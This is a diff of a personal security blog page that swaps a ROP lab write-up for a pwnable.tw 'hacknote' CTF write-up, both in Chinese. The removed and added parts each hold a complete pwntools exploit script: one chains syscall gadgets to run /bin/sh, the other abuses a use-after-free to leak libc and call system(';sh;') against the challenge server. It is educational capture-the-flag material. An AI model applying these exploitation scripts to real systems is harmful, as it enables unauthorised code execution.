@@ -13,32 +13,31 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://kazma.tw/2023/12/12/lys-rop-lab-rop1-writeup/"/>
+    <link rel="canonical" href="https://kazma.tw/2024/06/03/pwnable-tw-hacknote-writeup/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="lab_rop1執行看一下：  file 看一下：  r2 看一下 main：  OK，首先他把第一個輸入讀到全域變數 obj.name，然後開了一個 0x10 的 buffer 但是讀了 0x100 個 bytes。那我們的計畫就是把 “&#x2F;bin&#x2F;sh\0” 先放到 obj.name，然後正常 rop 就行，值得注意的是因為是 statically linked，所以基本上">
+        <meta name="description" content="Pwnable.tw - hacknoteDescription A good Hacker should always take good notes!  Sourcehttps:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#5  0x1 Initial Rconnaissance經典 heap 選單題，我們來分析一下他： file12└─$ file hacknotehacknote: EL">
 <meta property="og:type" content="article">
-<meta property="og:title" content="LYS Rop lab_rop1 Writeup">
-<meta property="og:url" content="https://kazma.tw/2023/12/12/LYS-Rop-lab-rop1-Writeup/index.html">
+<meta property="og:title" content="Pwnable.tw hacknote Writeup">
+<meta property="og:url" content="https://kazma.tw/2024/06/03/Pwnable-tw-hacknote-Writeup/index.html">
 <meta property="og:site_name" content="kazma&#39;s blog">
-<meta property="og:description" content="lab_rop1執行看一下：  file 看一下：  r2 看一下 main：  OK，首先他把第一個輸入讀到全域變數 obj.name，然後開了一個 0x10 的 buffer 但是讀了 0x100 個 bytes。那我們的計畫就是把 “&#x2F;bin&#x2F;sh\0” 先放到 obj.name，然後正常 rop 就行，值得注意的是因為是 statically linked，所以基本上">
+<meta property="og:description" content="Pwnable.tw - hacknoteDescription A good Hacker should always take good notes!  Sourcehttps:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#5  0x1 Initial Rconnaissance經典 heap 選單題，我們來分析一下他： file12└─$ file hacknotehacknote: EL">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://kazma.tw/images/lys_preview.png">
-<meta property="og:image" content="https://kazma.tw/images/stalink.png">
-<meta property="og:image" content="https://kazma.tw/images/lys_r2.png">
-<meta property="og:image" content="https://kazma.tw/images/objname.png">
-<meta property="og:image" content="https://kazma.tw/images/rop1_pwned.png">
-<meta property="article:published_time" content="2023-12-12T14:54:46.000Z">
-<meta property="article:modified_time" content="2023-12-13T17:06:43.143Z">
+<meta property="og:image" content="https://kazma.tw/images/haknote_addstruct.png">
+<meta property="og:image" content="https://kazma.tw/images/hacknote_struct2.png">
+<meta property="article:published_time" content="2024-06-03T08:01:28.181Z">
+<meta property="article:modified_time" content="2024-06-03T08:01:28.183Z">
 <meta property="article:author" content="kazma">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="writeup">
-<meta property="article:tag" content="lab">
-<meta property="article:tag" content="rop">
+<meta property="article:tag" content="pwnabletw">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="menu">
+<meta property="article:tag" content="fastbin">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://kazma.tw/images/lys_preview.png">
+<meta name="twitter:image" content="https://kazma.tw/images/haknote_addstruct.png">
     
     
     <!--- Icon Part-->
@@ -50,7 +49,7 @@
     
     <title>
         
-            LYS Rop lab_rop1 Writeup -
+            Pwnable.tw hacknote Writeup -
         
         kazma&#39;s blog
     </title>
@@ -387,7 +386,7 @@
 
         <div class="article-title">
             
-                <h1 class="article-title-regular">LYS Rop lab_rop1 Writeup</h1>
+                <h1 class="article-title-regular">Pwnable.tw hacknote Writeup</h1>
             
             </div>
             
@@ -409,15 +408,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2023-12-12 22:54:46</span>
-        <span class="mobile">2023-12-12 22:54:46</span>
+        <span class="desktop">2024-06-03 16:01:28</span>
+        <span class="mobile">2024-06-03 16:01:28</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-12-14 01:06:43</span>
-            <span class="mobile">2023-12-14 01:06:43</span>
+            <span class="desktop">2024-06-03 16:01:28</span>
+            <span class="mobile">2024-06-03 16:01:28</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -437,11 +436,19 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/lab/">lab</a>&nbsp;
+                        | <a href="/tags/pwnabletw/">pwnabletw</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/rop/">rop</a>&nbsp;
+                        | <a href="/tags/heap/">heap</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/menu/">menu</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/fastbin/">fastbin</a>&nbsp;
                     </li>
                 
             </ul>
@@ -467,64 +474,68 @@
 
 
         <div class="article-content markdown-body">
-            <h1 id="lab-rop1"><a href="#lab-rop1" class="headerlink" title="lab_rop1"></a>lab_rop1</h1><p>執行看一下：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/lys_preview.png"
-                      alt="preview"
-                ></p>
-<p>file 看一下：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/stalink.png"
-                      alt="stalink"
-                ></p>
-<p>r2 看一下 main：</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/lys_r2.png"
-                      alt="r2"
-                ></p>
-<p>OK，首先他把第一個輸入讀到全域變數 obj.name，然後開了一個 0x10 的 buffer 但是讀了 0x100 個 bytes。<br>那我們的計畫就是把 “&#x2F;bin&#x2F;sh\0” 先放到 obj.name，然後正常 rop 就行，值得注意的是因為是 statically linked，所以基本上 gadget 蠻好找的。<br>至於 obj.name 的位置怎麼找有蠻多方式的，r2 很貼心的把位址寫在 obj.name 上面，也可以直接開 ida 看，或是用 objdump 也行，這裡再示範一下 objdump 的找法：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -M intel -d rop1 | less</span><br></pre></td></tr></table></figure></div>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/../images/objname.png"
-                      alt="objname"
-                ><br>gadget 找法：</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./rop --only <span class="string">&quot;pop|ret&quot;</span> | less</span><br></pre></td></tr></table></figure></div>
-<p>exploit.py：</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">r = process(<span class="string">&quot;./rop1&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x000000000044fd87</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000401f4f</span></span><br><span class="line">pop_rdx_rbx = <span class="number">0x0000000000485bab</span></span><br><span class="line">pop_rsi = <span class="number">0x0000000000409f7e</span></span><br><span class="line">syscall = <span class="number">0x0000000000401d04</span></span><br><span class="line">address = <span class="number">0x4c7300</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name? &#x27;</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">p += p64(pop_rdi) + p64(address)</span><br><span class="line">p += p64(pop_rdx_rbx) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">p += p64(pop_rsi) + p64(<span class="number">0x0</span>)</span><br><span class="line">p += p64(pop_rax) + p64(<span class="number">0x3b</span>)</span><br><span class="line">p += p64(syscall)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln: &#x27;</span>, p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+            <h1 id="Pwnable-tw-hacknote"><a href="#Pwnable-tw-hacknote" class="headerlink" title="Pwnable.tw - hacknote"></a>Pwnable.tw - hacknote</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><blockquote>
+<p>A good Hacker should always take good notes!</p>
+</blockquote>
+<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#5" >https://pwnable.tw/challenge/#5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="0x1-Initial-Rconnaissance"><a href="#0x1-Initial-Rconnaissance" class="headerlink" title="0x1 Initial Rconnaissance"></a>0x1 Initial Rconnaissance</h2><p>經典 heap 選單題，我們來分析一下他：</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file hacknote</span><br><span class="line">hacknote: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=a32de99816727a2ffa1fe5f4a324238b2d59a606, stripped</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec hacknote</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/hacknote/hacknote&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8046000)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="hacknote"><a href="#hacknote" class="headerlink" title=".&#x2F;hacknote"></a>.&#x2F;hacknote</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :</span><br></pre></td></tr></table></figure></div>
+
+<p>x86 並且 stripped</p>
+<h2 id="0x2-Reverse-Engineering"><a href="#0x2-Reverse-Engineering" class="headerlink" title="0x2 Reverse Engineering"></a>0x2 Reverse Engineering</h2><p>我們看一下比較特別的部分：</p>
+<h3 id="add-note"><a href="#add-note" class="headerlink" title="add_note"></a>add_note</h3><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [esp+14h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( note_count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;ptr + i) = puts_content;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8u</span>);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (<span class="type">int</span>)*(&amp;ptr + i);</span><br><span class="line">        *(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;ptr + i) + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++note_count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ canary;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>我們搭配動態分析了解一下他是怎麼新增筆記的。<br>首先把斷點下在 <code>exit</code>，然後新增一個大小為 32 內容為 <code>aaaabbbb</code> 的筆記觀察一下他的結構：<br><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/rop1_pwned.png"
-                      alt="pwned"
-                ></p>
-<h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4>
+                     data-src="/../images/haknote_addstruct.png"
+                      alt="add_struct"
+                ><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/hacknote_struct2.png"
+                      alt="struct2"
+                ><br>可以看到他每一個筆記都會 <code>malloc</code> 兩次，首先固定會 <code>malloc(8)</code> 並且前 4 bytes 為一個會印出後 4 bytes 內容的功能，再來後 4 bytes 放的就是實際內容的 pointer，那要印出筆記內容的時候就會去呼叫這個印出內容的函式。<br>嗯，好酷的設計，有點硬要 XD</p>
+<h3 id="delete-note"><a href="#delete-note" class="headerlink" title="delete_note"></a>delete_note</h3><p>再來就是漏洞的關鍵點：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">delete_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= note_count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;ptr + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;ptr + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ canary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>他釋放的時候沒有正確清空記憶體，導致資料殘留形成 dangling pointer，因此有 UAF 可以利用。<br>逆向分析大概看到這邊，接著計畫我們的攻擊路線。</p>
+<h2 id="0x3-Exploitation"><a href="#0x3-Exploitation" class="headerlink" title="0x3 Exploitation"></a>0x3 Exploitation</h2><ol>
+<li>首先我們可以先宣告兩個筆記，然後再釋放掉其中一個避免被 Top Chunk 回收。</li>
+<li>再來我們故意跟他要一個 8 bytes 大小的筆記，如此就可以對剛剛刪除的筆記修改他印出時的行為，這裡我們可以填入 <code>puts_content</code> 後面放某個 GOT 的 pointer，再印出刪除的那個筆記內容，就可以透過減掉對應的 offset 成功 leak libc_base。</li>
+<li>有了 libc_base 後我們就可以重複剛剛的行為呼叫 system(‘sh’)</li>
+<li>不過因為我們必須填入 4 bytes，這裡參考網路上大致有兩種做法, ‘;sh;’ 和 ‘||sh’</li>
+<li>Pwned!!!</li>
+</ol>
+<h2 id="0x4-Exploit"><a href="#0x4-Exploit" class="headerlink" title="0x4 Exploit"></a>0x4 Exploit</h2><p>exploit.py:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;chall.pwnable.tw&quot;</span></span><br><span class="line">port = <span class="number">10102</span></span><br><span class="line">puts_addr = <span class="number">0x804862B</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, data</span>):</span><br><span class="line">    r.sendafter(<span class="string">b&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">b&quot;:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendafter(<span class="string">b&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendafter(<span class="string">b&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;-r&quot;</span>:</span><br><span class="line">    r = remote(host, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&quot;./hacknote&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, p32(puts_addr) + p32(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">l.address = u32(r.recv(<span class="number">4</span>)) - l.sym.puts</span><br><span class="line">success(<span class="string">&quot;libc_base -&gt; %s&quot;</span> % <span class="built_in">hex</span>(l.address))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>, p32(l.sym.system) + <span class="string">b&quot;;sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&quot;cat /home/`whoami`/flag&quot;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>result:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ python exploit.py -r</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/hacknote/hacknote&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8046000</span>)</span><br><span class="line">[*] <span class="string">&#x27;/home/kazma/pwnabletw/hacknote/libc_32.so.6&#x27;</span></span><br><span class="line">    Arch:     i386-<span class="number">32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to chall.pwnable.tw on port <span class="number">10102</span>: Done</span><br><span class="line">[+] libc_base -&gt; <span class="number">0xf758c000</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">FLAG&#123;Us3_aft3r_fl3333_in_h4ck_not3&#125;</span><br><span class="line">$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="0x5-Pwned"><a href="#0x5-Pwned" class="headerlink" title="0x5 Pwned!!!"></a>0x5 Pwned!!!</h3>
         </div>
 
         
             <div class="post-copyright-info">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> LYS Rop lab_rop1 Writeup</li>
+        <li><strong>Title:</strong> Pwnable.tw hacknote Writeup</li>
         <li><strong>Author:</strong> kazma</li>
         <li><strong>Created at
-                :</strong> 2023-12-12 22:54:46</li>
+                :</strong> 2024-06-03 16:01:28</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2023-12-14 01:06:43
+                    :</strong> 2024-06-03 16:01:28
             </li>
         
         <li>
-            <strong>Link:</strong> https://kazma.tw/2023/12/12/LYS-Rop-lab-rop1-Writeup/
+            <strong>Link:</strong> https://kazma.tw/2024/06/03/Pwnable-tw-hacknote-Writeup/
         </li>
         <li>
             <strong>
@@ -553,11 +564,19 @@
                     </li>
                 
                     <li class="tag-item">
-                        <a href="/tags/lab/">#lab</a>&nbsp;
+                        <a href="/tags/pwnabletw/">#pwnabletw</a>&nbsp;
                     </li>
                 
                     <li class="tag-item">
-                        <a href="/tags/rop/">#rop</a>&nbsp;
+                        <a href="/tags/heap/">#heap</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/menu/">#menu</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/fastbin/">#fastbin</a>&nbsp;
                     </li>
                 
             </ul>
@@ -568,29 +587,14 @@
         
             <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2023/12/13/Yuawn-Pwn1-casino-Writeup/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Yuawn Pwn1 casino Writeup</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next">
                         <a class="next"
                         rel="next"
-                        href="/2023/12/12/Yuawn-Pwn2-rop-Writeup/"
+                        href="/2024/05/04/Angr-CTF-Writeups-2/"
                         >
                             <span class="title flex justify-center items-center">
